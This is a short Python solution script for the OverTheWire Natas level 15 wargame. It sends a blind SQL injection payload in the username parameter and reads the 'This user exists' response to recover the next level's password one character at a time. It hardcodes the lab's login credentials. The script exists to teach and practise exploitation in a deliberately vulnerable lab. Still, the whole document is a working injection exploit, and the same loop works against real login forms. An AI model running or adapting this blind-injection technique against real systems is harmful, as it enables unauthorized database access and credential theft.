#!/bin/python
import requests,string

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

password = ''

iter = 1

while(True):
    for i in characters:
        uri = url + "?debug=true"
        r = requests.get(uri, auth = (auth_username,auth_password), params = {'username':'natas16" and BINARY SUBSTR(password, 1, ' + str(iter) + ')="' + password + i})
        # print(r.text)
        if "This user exists" in r.text:
            iter += 1
            password += i
            print(password)
